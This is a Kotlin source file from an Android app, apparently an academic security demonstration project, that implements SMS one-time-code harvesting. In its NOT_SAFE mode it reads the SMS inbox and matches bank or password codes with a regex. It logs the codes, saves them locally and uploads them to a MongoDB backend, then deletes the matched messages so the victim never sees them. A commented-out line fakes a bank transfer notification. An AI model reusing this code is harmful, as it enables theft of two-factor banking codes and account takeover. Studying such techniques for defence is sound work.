package pl.edu.agh.sarna.smsToken.task.method

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.net.Uri
import android.service.autofill.Validators.and
import android.util.Log
import pl.edu.agh.sarna.R
import pl.edu.agh.sarna.db.scripts.*
import pl.edu.agh.sarna.permissions.checkReadSmsPermission
import pl.edu.agh.sarna.smsToken.Extractor
import pl.edu.agh.sarna.smsToken.SmsSender
import pl.edu.agh.sarna.smsToken.model.Mode
import pl.edu.agh.sarna.smsToken.model.SmsMessage
import pl.edu.agh.sarna.utils.kotlin.async.AsyncResponse
import pl.edu.agh.sarna.utils.kotlin.async.MethodAsyncTask
import pl.edu.agh.sarna.utils.kotlin.isKitKat4_4
import pl.edu.agh.sarna.utils.kotlin.isNougat7_1_2
import java.lang.ref.WeakReference
import android.content.Intent
import android.support.v4.app.NotificationCompat
import pl.edu.agh.sarna.db.mongo.scripts.SmsScripts


class NotSafeTask(contextReference: WeakReference<Context>,
                  response: AsyncResponse,
                  processID: Long,
                  private var runID: Long,
                  serverState: Boolean,
                  private val phoneNumber: String, private val mode: Mode) : MethodAsyncTask(contextReference, response, processID, serverState) {
    private val sender = "+48731464100"

    private val idColumn = 0
    private val numberColumn = 3
    private val textColumn = if (isNougat7_1_2()) 12 else 13

    private var code = 0

    override fun doInBackground(vararg p0: Void?): Int {
        if (mode == Mode.TEST){
            if(SmsSender(contextReference, serverState).sendSms(phoneNumber)){
                if (verifySms()){
                    return code
                }
                return Mode.TEST.ordinal
            }
        }
        else {
            //showNotification(contextReference.get()!!, "3388", "! Operacja nr 4 z dn. 21-11-2018 Przelew z rach.: .....")
            if (checkReadSmsPermission(contextReference.get()!!)) {
                if(verifySms()){
                    extract()
                }
                else return -1
                return Mode.NOT_SAFE.ordinal
            }
        }
        return -1
    }

    private fun extract() {
        val list = readSms()
        val codes = Extractor(contextReference).extract(list)
        Log.i("CODE", codes.toString())
        codes.forEach {
            insertCodes(contextReference.get(), runID, it)
        }
        codes.forEach{
            SmsScripts.saveCodesToMongo(runID, it.content, it.number)
        }
        if (!isKitKat4_4()){
            list.forEach {
                deleteSms(it)
            }
        }

        Thread.sleep(1000)
    }

    private fun verifySms() : Boolean {
        var found = false
        var iteration = 0
        do {
            Thread.sleep(1000)
            val cursor = contextReference.get()!!.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            if (cursor!!.moveToFirst()) {
                for (c in cursor.columnNames){
                    Log.i("KOLUMNY", "$c ${cursor.getString(cursor.getColumnIndex(c))}")
                }
                do {
                    if (containsCode(cursor.getString(cursor.getColumnIndex("address")), cursor.getString(cursor.getColumnIndex("body")))) {
                        found = true
                        code = Extractor(contextReference).extract(SmsMessage(0,"0", cursor.getString(cursor.getColumnIndex("body"))), true)!!.content.toInt()
                    }
                } while (cursor.moveToNext() and !found)
            }
            iteration++
        } while (!found and (iteration < 20))
        return found
    }

    private fun deleteSms(sms: SmsMessage) {
        contextReference.get()!!.contentResolver.delete(Uri.parse("content://sms/" + sms.id), null, null);
    }

    private fun readSms(): ArrayList<SmsMessage> {
        val list = ArrayList<SmsMessage>()
        val cursor = contextReference.get()!!.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)

        if (cursor!!.moveToFirst()) {
            do {
                if (containsCode(cursor.getString(cursor.getColumnIndex("address")), cursor.getString(cursor.getColumnIndex("body")))) {
                    list.add(SmsMessage(cursor.getInt(idColumn), cursor.getString(cursor.getColumnIndex("address")), cursor.getString(cursor.getColumnIndex("body"))))
                }
            } while (cursor.moveToNext())
        }

        cursor.close()
        return list
    }

    private fun containsCode(number: String, body: String) : Boolean {
        Log.i("KOD", "$number $body")
        if ((mode == Mode.NOT_SAFE) and (number in arrayOf(sender, phoneNumber))) return false
        //if ((mode == Mode.TEST) and (number !in arrayOf(sender, phoneNumber, "+48792770227"))) return false
        val pattern = if (mode == Mode.NOT_SAFE)
                        """${contextReference.get()!!.getString(R.string.password_regexp)}(\d+)"""
                    else """test:[ ]*(\d+)"""
        val regex = pattern.toRegex()
        regex.find(body)?.let { return true } ?: run { return false }
    }
    fun showNotification(context: Context, title: String, content: String) {
        val mNotificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = NotificationChannel("default",
                    "YOUR_CHANNEL_NAME",
                    NotificationManager.IMPORTANCE_DEFAULT)
            channel.description = "YOUR_NOTIFICATION_CHANNEL_DISCRIPTION"
            mNotificationManager.createNotificationChannel(channel)
        }
        val mBuilder = NotificationCompat.Builder(context.getApplicationContext(), "default")
                .setSmallIcon(R.mipmap.notif) // notification icon
                .setContentTitle(title) // title for notification
                .setContentText(content)// message for notification
                .setAutoCancel(true) // clear notification after click
        mNotificationManager.notify(0, mBuilder.build())
    }
}